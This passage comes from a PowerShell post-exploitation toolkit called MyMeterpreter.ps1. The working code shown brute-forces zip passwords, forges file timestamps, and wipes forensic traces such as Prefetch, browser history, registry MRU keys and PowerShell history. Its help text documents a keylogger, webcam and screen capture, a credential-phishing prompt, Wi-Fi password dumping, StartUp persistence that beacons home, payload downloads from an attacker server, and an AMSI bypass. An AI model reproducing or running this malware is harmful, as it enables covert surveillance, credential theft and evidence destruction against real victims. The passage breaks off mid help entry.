      $SizeDump = ((Get-Item -Path "$BruteZip" -EA SilentlyContinue).length/1KB)
      Write-Host "[i] Archive $ZipArchiveName found!"
      Start-Sleep -Seconds 1
   }

   ## Download passwords.txt from @josh-newton github repository
   If(-not(Test-Path -Path "$PassList")){## Check if password list exists
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[+] Downloading $PassFile (BITS)"
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
   }Else{## User Input dicionary
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[i] dicionary $PassFile found!"
      Start-Sleep -Seconds 1
      $PasFileStatus = $True
   }

   If(-not($PasFileStatus -ieq $True)){
      ## Check for file download integrity (fail/corrupted downloads)
      $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 4002,8544921875/KB
      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 4002 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
         ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
         Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
         If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
      }Else{## Dicionary file found\downloaded
         $tdfdr = $PassList.Split('\\')[-1]
         Write-Host "[i] dicionary $tdfdr Dowloaded!"
         Start-Sleep -Seconds 1
      }
   }
   
   ## Start Brute Force Attack
   $BruteTimer = Get-Date -Format 'HH:mm:ss'
   Write-Host "[+] $BruteTimer - starting brute force module!" -ForeGroundColor Green
   If(Test-Path "$7z" -EA SilentlyContinue){
      $passwords = Get-Content -Path "$PassList" -EA SilentlyContinue

      ForEach($Item in $passwords){
         If($Thepasswordis -eq $null){
            $brute = &"C:\Program Files\7-Zip\7z.exe" e "$BruteZip" -p"$Item" -y

            If($brute -contains "Everything is Ok"){
               $Thepasswordis = $Item
               Clear-Host;Start-Sleep -Seconds 1
               Write-Host "`n`n$BruteTimer - Brute force Zip archives" -ForegroundColor Green
               Write-Host "------------------------------------"
               Write-Host "Zip Archive  : $ZipArchiveName" -ForegroundColor Green
               Write-Host "Archive Size : $SizeDump/KB" -ForegroundColor Green
               Write-Host "Password     : $Thepasswordis" -ForegroundColor Green
               Write-Host "------------------------------------"
            } ## Brute IF
         } ## Check passwordis
      } ## Foreach Rule

   }Else{## 7Zip Isn't Installed
      Write-Host "[error] 7Zip Mandatory Appl doesn't appear to be installed!" -ForegroundColor Red -BackgroundColor Black
   }
   ## Clean Old files left behind
   If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($FileMace -ne "false"){

   <#
   .SYNOPSIS
      Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date parameter

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt
      Changes sellected file mace using MyMeterprter default -Date "date-format"

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date "date-format"

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>

   Write-Host "[+] Change File Mace propertys" -ForegroundColor Green
   Start-Sleep -Seconds 1
   ## Make sure that the inputed file exists
   If(-not(Test-Path -Path "$FileMace" -EA SilentlyContinue)){
      Write-Host "[error] File not found: $FileMace!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
   }

   ## Make sure user have input the -Date parameter 
   If($Date -ieq "false" -or $Date -ieq $null){
      $Date = "08 March 1999 19:19:19"
   }

   ## Change file mace propertys {timestamp}
   Get-ChildItem $FileMace|% {$_.CreationTime = $Date}
   Get-ChildItem $FileMace|% {$_.lastaccesstime = $Date}
   Get-ChildItem $FileMace|% {$_.LastWriteTime = $Date}
   Get-ChildItem $FileMace|Select-Object FullName,Exists,CreationTime

Write-Host "";Start-Sleep -Seconds 1
}

If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){## TODO: <-- finish this function
$Count = 0       ## Loop counter
$ModRegKey = 0   ## Registry keys to modifie
$MyArtifacts = 0 ## MyMeterpreter aux scripts

   <#
   .SYNOPSIS
      Helper - Clean Temp\Logs\Script artifacts

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker steps.
      It deletes lnk, db, log, tmp files, recent
      folder, Prefetch, and registry locations.

   .NOTES
      Required Dependencies: cmd|regedit {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Clear

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Paranoid
      Remark: Paranoid @arg deletes @MyMeterpreter aux scripts

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>

   $ClearList = @(## Clear @arg
      "ipconfig /flushdns",
      "DEL /q /f /s %tmp%\*.vbs",
      "DEL /q /f /s %tmp%\*.bat",
      "DEL /q /f /s %tmp%\*.log",
      "DEL /q /f /s %userprofile%\*.log",
      "DEL /q /f /s %userprofile%\*.tmp",
      "DEL /q /f /s %windir%\Prefetch\*.*",
      "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
      'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
      'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
      'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
      'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   )

   $ParanoidList = @(## Paranoid @arg
      "ipconfig /flushdns",
      "DEL /q /f %windir%\*.tmp",
      "DEL /q /f %windir%\*.log",
      "DEL /q /f /s %tmp%\*.vbs",
      "DEL /q /f /s %tmp%\*.bat",
      "DEL /q /f /s %tmp%\*.log",
      "DEL /q /f %windir%\system\*.tmp",
      "DEL /q /f %windir%\system\*.log",
      "DEL /q /f %windir%\system32\*.tmp",
      "DEL /q /f %windir%\system32\*.log",
      "DEL /q /f /s %windir%\Prefetch\*.*",
      "DEL /q /f /s %userprofile%\*.tmp",
      "DEL /q /f /s %userprofile%\*.log",
      "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
      "DEL /q /f /s %appdata%\Mozilla\Firefox\Profiles\*.*",
      "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
      'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\*.tmp',
      'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\History\*.*',
      "DEL /q /f %userprofile%\AppData\Local\Microsoft\Windows\Explorer\*.db",
      "DEL /q /f C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\Low\*.dat",
      'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
      'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
      'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
      'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
      'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f',
      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
      'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   )

   ## Loop truth Array Lists
   $DateNow = Get-Date -Format 'HH:mm:ss'
   If($CleanTracks -ieq "Clear"){$ModRegKey = "2"
      ForEach($Item in $ClearList){
         cmd /R $Item
         $Count++
      }
   }ElseIf($CleanTracks -ieq "Paranoid"){$ModRegKey = "4"
      ForEach($Item in $ParanoidList){
         cmd /R $Item
         $Count++
      }
   }

   ## Clean ALL files\folders under %TMP% except scripts.ps1
   $FilesToDelete = (Get-ChildItem -Path "$Env:TMP" -Recurse -Exclude *.ps1 -EA SilentlyContinue).FullName
   ForEach($Item in $FilesToDelete){
      Remove-Item $Item -Recurse -Force -EA SilentlyContinue
   }

   ## Clear PS Logging History
   $CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
   If(-not($CleanPSLogging -ieq $null)){## 'ConsoleHost_history.txt' found
      echo "null" > $CleanPSLogging
   }Else{## Fail to find 'ConsoleHost_history.txt'
      ## Path: $Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
      Write-Host "fail delete  - PS Logging History!"
   }


   ## Delete @MyMeterpreter artifacts
   If($CleanTracks -ieq "Paranoid"){

      <#
      .SYNOPSIS
         Paranoid @arg deletes @MyMeterpreter auxiliary scripts

      .NOTES
        Persiste.vbs, Sherlock.ps1, webserver.ps1,
        Start-WebServer.ps1, CredsPhish.ps1 
      #>

      $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs"
      If(Test-Path -Path "$PersistePath" -EA SilentlyContinue){
         Remove-Item -Path "$PersistePath" -Force
         $MyArtifacts = $MyArtifacts+1
      }
      If(Test-Path -Path "$Env:TMP\Sherlock.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force
         $MyArtifacts = $MyArtifacts+1
      }
      If(Test-Path -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\webserver.ps1" -Force
         $MyArtifacts = $MyArtifacts+1
      }
      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force
         $MyArtifacts = $MyArtifacts+1
      }
      If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force
         $MyArtifacts = $MyArtifacts+1
      }
   }

   Write-Host ""
   ## Create Data Table for output DateNow
   $mytable = new-object System.Data.DataTable
   $mytable.Columns.Add("Function") | Out-Null
   $mytable.Columns.Add("Date") | Out-Null
   $mytable.Columns.Add("DataBaseEntrys") | Out-Null
   $mytable.Columns.Add("ModifiedRegKeys") | Out-Null
   $mytable.Columns.Add("ScriptsCleaned") | Out-Null
   $mytable.Rows.Add("CleanTracks",
                     "$DateNow",
                     "$Count",
                     "$ModRegKey",
                     "$MyArtifacts") | Out-Null

   ## Display Table
   $mytable|Format-Table -AutoSize

Write-Host "";Start-Sleep -Seconds 1
}


## --------------------------------------------------------------
##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
## --------------------------------------------------------------


If($Help -Match '^[-]'){## User Input bad syntax
   $Help = $Help -replace '^[-]','' ## fix bad syntax
}

If($Help -ieq "sysinfo"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Enumerates remote host basic system info

   .DESCRIPTION
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..
      Remark: If you wish to hidde Public-IP displays then edit this
      CmdLet and change '`$HiddePublicIPaddr = `$False' to `$True ..

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetDnsCache"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Enumerate remote host DNS cache entrys
      
   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete entrys}

   .OUTPUTS
      Entry                           Data
      -----                           ----
      example.org                     93.184.216.34
      play.google.com                 216.239.38.10
      www.facebook.com                129.134.30.11
      safebrowsing.googleapis.com     172.217.21.10
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetConnections"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Gets a list of ESTABLISHED connections (TCP)
   
   .DESCRIPTION
      Enumerates ESTABLISHED TCP connections and retrieves the
      ProcessName associated from the connection PID (Id) identifier
    
   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Verbose
      Retrieves process info from the connection PID (Id) identifier

   .OUTPUTS
      Proto  Local Address          Foreign Address        State           Id
      -----  -------------          ---------------        -----           --
      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512

      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
      -------  ------    -----      -----     ------     --  -- -----------
          671      47    39564      28452       1,16  10516   4 firefox
          426      20     5020      21348       1,47   3344   0 svchost
         1135      77   252972     271880      30,73   5512   4 powershell
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetInstalled"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
     Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                   DisplayVersion     
      -----------                   --------------     
      Adobe Flash Player 32 NPAPI   32.0.0.314         
      ASUS GIFTBOX                  7.5.24
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetProcess" -or $Help -ieq "ProcessName"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
     Helper - Enumerate/Kill running process

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}

   .EXAMPLE
      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .OUTPUTS
      Id              : 8564
      Name            : ApplicationFrameHost
      Path            : C:\WINDOWS\system32\ApplicationFrameHost.exe
      Company         : Microsoft Corporation
      FileVersion     : 10.0.18362.1316 (WinBuild.160101.0800)
      MainWindowTitle : Calculadora
      StartTime       : 23/01/2021 16:01:47
      Responding      : True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetTasks" -or $Help -ieq "TaskName" -or $Help -ieq "Interval" -or $Help -ieq "Exec"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
     Helper - Enumerate\Create\Delete running tasks

   .DESCRIPTION
      This module enumerates remote host running tasks
      Or creates a new task Or deletes existence tasks

   .NOTES
      Required Dependencies: cmd|schtasks {native}
      Remark: Module parameters are auto-set {default}
      Remark: Tasks have the default duration of 9 hours.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create
      Use module default settings to create the demo task

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
      Deletes mytask taskname

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      mytask                                   24/01/2021 17:43:44    Running
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready 
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Enumerate\Clear eventvwr logs

   .NOTES
      Required Dependencies: wevtutil {native}
      The Clear @argument requires Administrator privs
      on shell to be abble to 'Clear' Eventvwr entrys.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose
      List the newest 10 (default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
      List the newest 28 Eventvwr Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Clear
      Remark: Clear @arg requires Administrator privs on shell

   .OUTPUTS
      Max(K) Retain OverflowAction    Entries Log                   
      ------ ------ --------------    ------- ---                            
      20 480      0 OverwriteAsNeeded   1 024 Application           
      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
      20 480      0 OverwriteAsNeeded      74 System                
      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetBrowsers"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Active   81.0.2          True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Screenshot" -or $Help -ieq "Delay"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Camera"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - List computer device names or capture snapshot

   .NOTES
      Remark: WebCam turns the ligth 'ON' taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "StartWebServer" -or $Help -ieq "SPort"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Upload" -or $Help -ieq "ApacheAddr" -or $Help -ieq "Destination"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Download files from attacker {apache2}

   .NOTES
      Required Attacker Dependencies: apache2 webroot
      Required Target Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to `$Env:TMP by default.

   .EXAMPLE
      Syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
      Example: powershell -File MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
      Download FileName.ps1 script from attacker apache2 (192.168.1.73) into `$Env:TMP\FileName.ps1 Local directory.
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Keylogger"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Start
      Start recording target system keystrokes

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier and delete
      keylogger script and all respective files/logs left behind.

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Mouselogger" -or $Help -ieq "Timmer"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'
      with the help of psr.exe native windows 10 (error report service).
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PhishCreds"){
$HelpParameters = @"

   <#!Help.
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: CredsPhish.ps1 CmdLet requires Admin privileges to Start|Stop services.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "EOP"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Persiste" -or $Help -ieq "BeaconTime"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Use double quotes if Path has any empty spaces in name.
      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
      to manual check the status of wscript process (BeaconHome function)

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "WifiPasswords" -or $Help -ieq "Storage"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "SpeakPrank" -or $Help -ieq "Rate" -or $Help -ieq "Volume"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
